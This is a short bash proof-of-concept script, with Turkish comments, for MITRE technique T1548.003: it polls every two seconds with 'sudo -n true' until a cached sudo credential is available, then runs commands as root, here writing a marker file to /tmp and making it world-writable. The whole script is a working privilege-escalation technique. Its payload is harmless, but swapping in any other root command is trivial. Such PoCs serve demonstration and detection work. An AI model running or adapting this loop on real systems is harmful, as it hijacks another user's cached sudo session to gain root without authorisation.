#!/bin/bash
#T1548.003 - Sudo Cache Abuse PoC

echo "Sudo cache bekleniyor..."

while true; do
    #sudo -n' şifre isterse false döner cache açıksa başarılı olur
    if sudo -n true 2>/dev/null; then
        echo "Sudo cache geldi root islemi hallediliyor..."
        #Root yetkisiyle yapılıcak işlemler
        sudo bash -c 'echo "Timestamp cache istismar edildi!" > /tmp/root_poc.txt'
        sudo chmod 777 /tmp/root_poc.txt
        echo "Inanmiyorsan bak >>> /tmp/root_poc.txt"
        break
    fi
    sleep 2
done